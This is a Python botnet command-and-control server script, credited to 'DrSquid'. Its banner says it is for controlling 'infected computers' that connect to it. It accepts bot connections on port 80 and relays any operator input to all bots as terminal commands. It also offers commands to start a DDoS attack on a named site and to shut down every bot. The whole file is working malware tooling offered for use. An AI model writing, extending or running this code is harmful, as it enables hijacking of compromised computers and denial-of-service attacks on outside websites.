import socket, threading, os, time, sys
ip = '0.0.0.0'
port = 80
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((ip, port))
hostname = socket.gethostname()
connections = []
start_recv = False
bot_count = 0
print(" ____        _              _      _____                            ___    ___  ")
print("|  _ \      | |            | |    / ____|                          |__ \  / _ \ ")
print("| |_) | ___ | |_ _ __   ___| |_  | (___   ___ _ ____   _____ _ __     ) || | | |")
print("|  _ < / _ \| __| '_ \ / _ \ __|  \___ \ / _ \ '__\ \ / / _ \ '__|   / / | | | |")
print("| |_) | (_) | |_| | | |  __/ |_   ____) |  __/ |   \ V /  __/ |     / /_ | |_| |")
print("|____/ \___/ \__|_| |_|\___|\__| |_____/ \___|_|    \_/ \___|_|    |____(_)___/ ")
print("Script by DrSquid")
print("")
print("This is a server for making infected computers with the client-side script connect\nto this server and allowing you to run ssh commands or starting a DDoS Attack on\nwebsites via these bots. Make sure that you have port forwarded so that you can \nuse this script externally.")
print("")
print(f"[+] Server Hosted On Device: {hostname}")
print(f"[+] Server Hosted On IP: {ip}, {socket.gethostbyname(socket.gethostname())}")
print(f"[+] Server Hosted On Port: {port}")
print("")
def listen():
    while True:
        s.listen(1)
        conn, ip = s.accept()
        start_recv = True
        connections.append(conn)
        print(f"\n[+] {ip} has joined the server.")
def instruct():
    print("[+] Commands List:")
    print("")
    print("[+] !ddos <ip/domain> - Command initiates a DDoS attack from the bots to the provided ip/domain")
    print("[+] !listcon - Lists all the bots")
    print("[+] !botcount - Counts all of the bots connected")
    print("[+] !shutdownAll - Shuts down all connected bot computers")
    print("")
    print("[+] Note: All other things said will run a terminal command on the bot computers.")
    print("[+] Restarting the server is recommended if there are disconnections from the bots.")
    print("")
    print("[+] Server is now listening for connections......")
    print("")
    while True:
        try:
            instruction = input("[+] Enter your instruction: ")
            instruction = instruction.encode()
            if instruction.decode().lower() == "help":
                os.system('help')
            elif instruction.decode().lower().startswith('!ddos'):
                if len(connections) == 0:
                    print("")
                    print("[+] Unable to perform DDoS Attack.\n[+] There are no bots connected!\n")
                else:
                    msg = instruction.decode()
                    msg = msg.split()
                    if len(msg) >= 1:
                        ddosIP = msg[1]
                        try:
                            ddosIP = socket.gethostbyname(ddosIP)
                            print("")
                            print("[+] Starting DDoS Attack.")
                            print("[+] Gathering Bots.....")
                            print("")
                            time.sleep(2)
                            print("[+] DDoS Attack Started.")
                            print("")
                        except:
                            print("[+] Invalid IP provided. Usage: !ddos <ip/domain>")
                            print("")
                    else:
                        print("")
            elif instruction.decode().lower().startswith('!listcon'):
                print("")
                print("[+] List of bots:")
                print(connections)
                print("")
            elif instruction.decode().lower().startswith('!botcount'):
                print("")
                print(f"[+] Total Bot Count: {len(connections)}")
                print("")
            elif instruction.decode().lower().startswith('!shutdownall'):
                print("[+] Shutting Down Bots....")
                time.sleep(2)
                instruction == "shutdown /s"
                instruction = instruction.decode()
            else:
                print("")
                print(f"[+] Sending '{instruction.decode()}' as a bash command to the bots.....")
                print("")
            for connection in connections:
                try:
                    conn = connection
                    conn.send(instruction)
                except:
                    print(f"[+] Connection lost for conn: {conn}")
                    conn.close()
        except:
            pass
listeN = threading.Thread(target=listen)
listeN.start()
instrucT = threading.Thread(target=instruct)
instrucT.start()
